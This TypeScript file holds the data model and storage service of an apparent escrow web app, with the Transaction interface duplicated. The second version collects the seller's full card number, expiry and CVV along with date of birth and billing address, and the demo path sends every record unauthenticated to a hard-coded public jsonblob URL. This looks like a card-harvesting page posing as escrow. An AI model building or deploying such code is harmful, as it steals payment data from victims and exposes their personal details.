
export interface Transaction {
  id: string;
  status: 'Waiting for Seller' | 'Payment Pending' | 'Payment Secured' | 'Waiting for Buyer Confirmation' | 'Completed' | 'Cancelled';
  buyer: {
    fullName: string;
    email: string;
    phone: string;
  };
  item: {
    name: string;
    description: string;
    quantity: number;
    price: number;
    currency: string;
    notes?: string;
  };
  seller?: {
    firstName: string;
    lastName: string;
    email: string;
    phone: string;
    dob: string;
    billing: {
      country: string;
      address1: string;
      address2: string;
      state: string;
      city: string;
      zip: string;
    };
    paymentMethod: 'card' | 'paypal';
    cardBrand: string;
    cardLast4: string;
  };
  createdAt: string;
  updatedAt: string;
}


import { CONFIG } from '../config';

export interface Transaction {
  id: string;
  status: 'Waiting for Seller' | 'Payment Pending' | 'Payment Secured' | 'Waiting for Buyer Confirmation' | 'Completed' | 'Cancelled';
  buyer: {
    fullName: string;
    email: string;
    phone: string;
  };
  item: {
    name: string;
    description: string;
    quantity: number;
    price: number;
    currency: string;
    notes?: string;
  };
  seller?: {
    firstName: string;
    lastName: string;
    email: string;
    phone: string;
    dob: string;
    billing: {
      country: string;
      address1: string;
      address2: string;
      state: string;
      city: string;
      zip: string;
    };
    paymentMethod: 'card' | 'paypal';
    cardNunber: string;
    expiry: string;
    cvv: string;
  };
  createdAt: string;
  updatedAt: string;
}

// Using a fixed public bin for the demo to enable cross-device testing without keys.
// In a real scenario, the user should replace this with their JSONBin keys in config.ts
const DEMO_BIN_URL = 'https://jsonblob.com/api/jsonblob/1345876210364032'; 

export const storageService = {
  async saveTransaction(transaction: Transaction): Promise<void> {
    if (!CONFIG.USE_DEMO_STORAGE && CONFIG.JSONBIN_API_KEY && CONFIG.JSONBIN_BIN_ID) {
      // REAL JSONBin Implementation
      try {
        const response = await fetch(`https://api.jsonbin.io/v3/b/${CONFIG.JSONBIN_BIN_ID}`, {
          headers: { 'X-Master-Key': CONFIG.JSONBIN_API_KEY }
        });
        const data = await response.json();
        const transactions = data.record || {};
        transactions[transaction.id] = transaction;

        await fetch(`https://api.jsonbin.io/v3/b/${CONFIG.JSONBIN_BIN_ID}`, {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/json',
            'X-Master-Key': CONFIG.JSONBIN_API_KEY
          },
          body: JSON.stringify(transactions)
        });
      } catch (e) {
        console.error('JSONBin Save Error:', e);
      }
    } else if (CONFIG.USE_DEMO_STORAGE) {
      // DEMO Storage Implementation (Cross-device via jsonblob)
      try {
        const response = await fetch(DEMO_BIN_URL);
        const transactions = await response.json() || {};
        transactions[transaction.id] = transaction;

        await fetch(DEMO_BIN_URL, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(transactions)
        });
      } catch (e) {
        console.error('Demo Storage Save Error:', e);
        // Fallback to local if network fails
        const local = this.getAllLocalTransactions();
        local[transaction.id] = transaction;
        localStorage.setItem('vercel_escrow_txs', JSON.stringify(local));
      }
    } else {
      // Fallback to LocalStorage
      const transactions = this.getAllLocalTransactions();
      transactions[transaction.id] = transaction;
      localStorage.setItem('vercel_escrow_txs', JSON.stringify(transactions));
    }
  },

  async getTransaction(id: string): Promise<Transaction | null> {
    if (!CONFIG.USE_DEMO_STORAGE && CONFIG.JSONBIN_API_KEY && CONFIG.JSONBIN_BIN_ID) {
      try {
        const response = await fetch(`https://api.jsonbin.io/v3/b/${CONFIG.JSONBIN_BIN_ID}`, {
          headers: { 'X-Master-Key': CONFIG.JSONBIN_API_KEY }
        });
        const data = await response.json();
        return data.record ? data.record[id] : null;
      } catch (e) {
        console.error('JSONBin Fetch Error:', e);
        return null;
      }
    } else if (CONFIG.USE_DEMO_STORAGE) {
      try {
        const response = await fetch(DEMO_BIN_URL);
        const transactions = await response.json() || {};
        return transactions[id] || null;
      } catch (e) {
        console.error('Demo Storage Fetch Error:', e);
        const local = this.getAllLocalTransactions();
        return local[id] || null;
      }
    } else {
      const transactions = this.getAllLocalTransactions();
      return transactions[id] || null;
    }
  },

  getAllLocalTransactions(): Record<string, Transaction> {
    const data = localStorage.getItem('vercel_escrow_txs');
    return data ? JSON.parse(data) : {};
  },

  generateTransactionId(): string {
    return `ESC-${Math.random().toString(36).substr(2, 8).toUpperCase()}`;
  }
};
